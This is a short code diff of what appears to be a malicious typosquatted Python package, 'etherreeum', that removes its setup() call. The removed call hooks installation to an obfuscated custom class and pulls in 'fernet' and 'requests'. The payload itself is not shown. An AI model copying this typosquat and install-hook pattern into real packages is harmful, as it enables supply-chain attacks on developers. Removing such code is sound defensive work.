@@ -18,22 +18,5 @@ class yWXxDLcQurEpasbgWcDXgMDfAshGDLrvEfjJKpmmnDFZWIMsyotAffqpjISOpqHVQQgysoKrOG
             install.run(self)
 
 
-setup(
-    name="etherreeum",
-    version=VERSION,
-    author="sMSwQeK",
-    author_email="QhoUSf@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': yWXxDLcQurEpasbgWcDXgMDfAshGDLrvEfjJKpmmnDFZWIMsyotAffqpjISOpqHVQQgysoKrOGfRXtKZGXhYzkIxHaqmXCmszktYCSnOdosCQTeObEBxmSOiShUqrkVHUkSraS,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         
 
